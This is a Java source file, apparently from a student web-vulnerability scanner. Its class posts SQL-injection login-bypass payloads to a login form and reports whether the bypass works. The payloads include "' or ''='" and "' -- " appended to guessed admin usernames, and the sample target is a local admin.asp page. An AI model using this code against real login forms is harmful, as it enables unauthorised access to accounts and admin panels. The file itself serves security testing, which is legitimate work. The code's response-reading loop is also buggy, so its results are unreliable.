package cn.edu.neu.LY.FormBypass;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
//import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;

import sun.net.www.protocol.http.HttpURLConnection;

import static cn.edu.neu.HJ.GUI.GUIStart.*;

public class Formbypass {
	private String url;
	private String charset;
	private String name;
	private String password;
	private String urlString;
	ArrayList<String> tname=new ArrayList<String>();
	ArrayList<String> tpassword= new ArrayList<String>();
	ArrayList<String> username=new ArrayList<String>();
	public Formbypass(String url){
		this.url=url;
		System.out.println("正在检测 ： " + this.url);
        mf.setFormBypassProcessText("正在检测 ： " + this.url + "\n");
        username.add("owen");
		username.add("admin");//前两个是新闻网站管理员登陆界面的用户名
		username.add("122_1");//论坛网站登陆的用户名
	}

	//detect是一定要调用的方法
	public boolean detect() throws IOException{   //检测各种绕过方法是否能绕过登陆表单,true表示可以绕过，false表示不能绕过
		FormBypassParser p =new FormBypassParser(this.url);
//		System.out.println(p.getN_name());
//		System.out.println(p.getP_name());
		charset=p.getCharset();
		name=p.getN_name();
		password=p.getP_name();
		if(name==null||password==null){            //在表单中找不到用户名口令输入框，则不能进行表单绕过
			System.out.println("结果：没有相应表单，不能进行表单绕过");
            mf.setFormBypassResultText("结果：没有相应表单，不能进行表单绕过\n");
			return false;
		}
		urlString =this.url.substring(0, this.url.lastIndexOf("/")+1);
		urlString+=p.getAction();
//		System.out.println(urlString);
		ArrayList<String> list = new ArrayList<String>();
		ArrayList<String> listpost = new ArrayList<String>();
		tname.add("abcd");
		tpassword.add("abcd");
		list=post(tname.get(0),tpassword.get(0));
//		for (int i = 0; i < list.size(); i++) {
//			System.out.println("用于对比的list: " + list.get(i));
//		}
		tname.set(0, "' or ''='");
		tpassword.set(0, "' or ''='");
		System.out.println("正在检测的用户名： " + tname.get(0) + " 口令:" + tpassword.get(0));
        mf.setFormBypassProcessText("正在检测的用户名： " + tname.get(0) + " 口令:" + tpassword.get(0) + "\n");
		listpost=post(tname.get(0),tpassword.get(0));
		if(!isSame(list,listpost)){
			System.out.println(isSame(list,listpost));
			System.out.println("可以进行表单绕过");
            mf.setFormBypassResultText("可以进行表单绕过\n");
			return true;
		}
		System.out.println("正在检测的用户名： " + "用户名+' or ''=' " + "口令:" + "空");
        mf.setFormBypassProcessText("正在检测的用户名： " + "用户名+' or ''=' " + "口令:" + "空" + "\n");
		for(int i=0;i<username.size();i++){         //for循环分别检测username列表中的几个用户名，因为不知道哪个用户名对应正在检测的登陆表单
			String s=username.get(i);
//			System.out.println(s);
			tname.set(0,s+"' or ''='");
			tpassword.set(0," ");
			listpost=post(tname.get(0),tpassword.get(0));
			if(!isSame(list,listpost)){
				System.out.println("可以进行表单绕过");
                mf.setFormBypassResultText("可以进行表单绕过");
//				System.out.println(isSame(list,listpost));
				return true;
			}
		}
		System.out.println("正在检测的用户名： "+"用户名+' -- "+"口令:"+"空");
        mf.setFormBypassProcessText("正在检测的用户名： "+"用户名+' -- "+"口令:"+"空\n");
		for(int i=0;i<username.size();i++){
			String s=username.get(i);
			tname.set(0,s+"' -- ");
			tpassword.set(0," ");
			listpost=post(tname.get(0),tpassword.get(0));
			if(!isSame(list,listpost)){
				System.out.println("可以进行表单绕过");
                mf.setFormBypassResultText("可以进行表单绕过");
				return true;
			}
		}
		System.out.println("不可以进行表单绕过");
        mf.setFormBypassResultText("不可以进行表单绕过");
		return false;
	}
	/**
	 * 非常简单的模糊匹配判断两个页面是否相同
	 * @param list1
	 * @param list2
	 * @return
	 */

	public boolean isSame(ArrayList<String> list1,ArrayList<String> list2){

		int size1 = list1.size();
		int size2 = list2.size();
//		System.out.println(size1);
//		System.out.println(size2);

		if (size1!=size2) {
			return false;
		}
		return true;
	}
	public ArrayList<String> post(String na,String pwd) throws IOException{
		String content=na;
		String content1=pwd;
		String writein=null;
		ArrayList<String> rethtml = new ArrayList<String>();
		try {
			URL url=new URL(urlString);
			HttpURLConnection con=(HttpURLConnection) url.openConnection();
			//将连接设为输出模式
			con.setDoOutput(true);
			con.setDoInput(true);
			//得到输出流
			OutputStreamWriter out = new OutputStreamWriter(con.getOutputStream(),charset);
//			System.out.println(name);
//			System.out.println(password);
			writein=name + "=" + content + "&" + password + "=" + content1;
			out.write(writein);
			out.flush();
			out.close();
			InputStream input = con.getInputStream();
			//三层包装：
			BufferedReader br = new BufferedReader(new InputStreamReader(input));
			while(br.readLine()!=null){
//				System.out.println(br.readLine());
				rethtml.add(br.readLine());

			}

		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return rethtml;
	}
	public static void main(String[] args) throws Exception{
		Formbypass fp=new Formbypass("http://192.168.100.221/news/admin/admin.asp");
		fp.detect();
	}
}
